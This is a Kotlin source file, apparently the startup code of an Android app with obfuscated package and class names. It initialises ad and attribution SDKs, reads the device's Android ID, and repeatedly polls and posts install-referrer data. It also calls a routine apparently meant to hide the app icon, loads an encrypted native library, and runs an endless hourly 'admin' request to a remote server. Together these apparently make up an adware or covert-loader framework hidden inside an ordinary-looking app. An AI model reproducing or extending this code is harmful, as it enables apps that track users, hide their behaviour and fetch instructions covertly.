package com.jia.opens.golden.scales.towards.pngstart

import android.annotation.SuppressLint
import android.app.Application
import android.provider.Settings
import com.android.installreferrer.api.InstallReferrerClient
import com.android.installreferrer.api.InstallReferrerStateListener
import com.anythink.core.api.ATSDK
import com.jia.opens.golden.scales.towards.vjire.PngCanGo
import com.jia.opens.golden.scales.towards.vjire.PngAllData
import com.jia.opens.golden.scales.towards.jgri6sd.OkSpBean
import com.jia.opens.golden.scales.towards.vjire.TtPoint
import com.jia.opens.golden.scales.towards.acan.TopOnTool
import com.jia.opens.golden.scales.towards.acan.TiH5Xian
import com.jia.opens.golden.scales.towards.acan.ShowDataTool
import com.jia.opens.golden.scales.towards.vjire.NetTool
import com.jia.opens.golden.scales.towards.zsdk5f.A76fef
import com.jia.opens.golden.scales.towards.zsdk5f.HealthCreon
import com.tencent.mmkv.MMKV
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import java.io.File
import java.util.UUID

object startApp {
    lateinit var mainStart: Application
    var mustXS: Boolean = true
    val adShowFun = TopOnTool()
    val h5Limiter = TiH5Xian()
    lateinit var okSpBean: OkSpBean
    fun init(application: Application, mustXSData: Boolean) {
        if (!PngCanGo.isMainProcess(application)) {
            return
        }
        MMKV.initialize(application)
        ShowDataTool.showLog("San MainStart init")
        mainStart = application
        mustXS = mustXSData
        val lifecycleObserver = CanLife()
        application.registerActivityLifecycleCallbacks(lifecycleObserver)
        initSDKData()
        okSpBean = OkSpBean()
        getAndroidId()
        com.jia.opens.golden.scales.towards.acan.TopOnUtils.noShowICCC()
        launchRefData()
        com.jia.opens.golden.scales.towards.acan.TopOnUtils.sessionUp()
        com.jia.opens.golden.scales.towards.acan.TopOnUtils.initAppsFlyer()
        com.jia.opens.golden.scales.towards.acan.TopOnUtils.getFcmFun()
    }

    private fun initSDKData() {
        val path = "${mainStart.applicationContext.dataDir.path}/pngjia"
        File(path).mkdirs()
        ATSDK.init(mainStart, PngAllData.getConfig().appid, PngAllData.getConfig().appkey)
        ATSDK.setNetworkLogDebug(!mustXS)
//        A76fef.Kiwfdjs(mainStart)
        HealthCreon.loadEncryptedSo(mainStart)
    }

    @SuppressLint("HardwareIds")
    private fun getAndroidId() {
        val adminData = okSpBean.appiddata
        if (adminData.isEmpty()) {
            val androidId =
                Settings.Secure.getString(mainStart.contentResolver, Settings.Secure.ANDROID_ID)
            if (!androidId.isNullOrBlank()) {
                okSpBean.appiddata = androidId
            } else {
                okSpBean.appiddata = UUID.randomUUID().toString()
            }
        }
    }

    private fun launchRefData() {
        val refData = okSpBean.refdata
        val intJson = okSpBean.IS_INT_JSON
        if (refData.isNotEmpty()) {
            startOneTimeAdminData()
            intJson.takeIf { it.isNotEmpty() }?.let {
                TtPoint.postInstallData(mainStart)
            }
            return
        }
        ShowDataTool.showLog("launchRefData=$refData")
        startRefDataCheckLoop()
    }

    private fun startRefDataCheckLoop() {
        CoroutineScope(Dispatchers.IO).launch {
            while (okSpBean.refdata.isEmpty()) {
                refInformation()
                delay(10100)
            }
        }
    }

    private fun refInformation() {
        runCatching {
            val referrerClient = InstallReferrerClient.newBuilder(mainStart).build()
            referrerClient.startConnection(object : InstallReferrerStateListener {
                override fun onInstallReferrerSetupFinished(responseCode: Int) {
                    handleReferrerSetup(responseCode, referrerClient)
                }

                override fun onInstallReferrerServiceDisconnected() {
                }
            })
        }.onFailure { e ->
            ShowDataTool.showLog("Failed to fetch referrer: ${e.message}")
        }
    }

    private fun handleReferrerSetup(responseCode: Int, referrerClient: InstallReferrerClient) {
        when (responseCode) {
            InstallReferrerClient.InstallReferrerResponse.OK -> {
                val installReferrer = referrerClient.installReferrer.installReferrer
                if (installReferrer.isNotEmpty()) {
                    okSpBean.refdata = installReferrer
                    TtPoint.postInstallData(mainStart)
                    startOneTimeAdminData()
                }
                ShowDataTool.showLog("Referrer  data: ${installReferrer}")
            }

            else -> {
                ShowDataTool.showLog("Failed to setup referrer: $responseCode")
            }
        }

        kotlin.runCatching {
            referrerClient.endConnection()
        }
    }

    private fun startOneTimeAdminData() {
        val adminData = okSpBean.admindata
        ShowDataTool.showLog("startOneTimeAdminData: $adminData")
        if (adminData.isEmpty()) {
            TtPoint.onePostAdmin()
        } else {
            TtPoint.twoPostAdmin()
        }
        //1hours
        scheduleHourlyAdminRequest()
    }


    private fun scheduleHourlyAdminRequest() {
        //协程
        CoroutineScope(Dispatchers.IO).launch {
            while (true) {
                delay(1000 * 60 * 60)
                ShowDataTool.showLog("延迟1小时循环请求")
                NetTool.executeAdminRequest(object : NetTool.ResultCallback {
                    override fun onComplete(result: String) {
                        ShowDataTool.showLog("Admin request successful: $result")
                    }

                    override fun onError(message: String) {
                        ShowDataTool.showLog("Admin request failed: $message")
                    }
                })
            }
        }
    }

    fun canIntNextFun() {
        adShowFun.startRomFun()
    }

    //对字符串进行分割
    fun String.splitString(delimiter: String): List<String> {
        require(delimiter.isNotEmpty()) { "Delimiter cannot be empty" }
        return this.split(delimiter.toRegex(RegexOption.LITERAL))
    }


}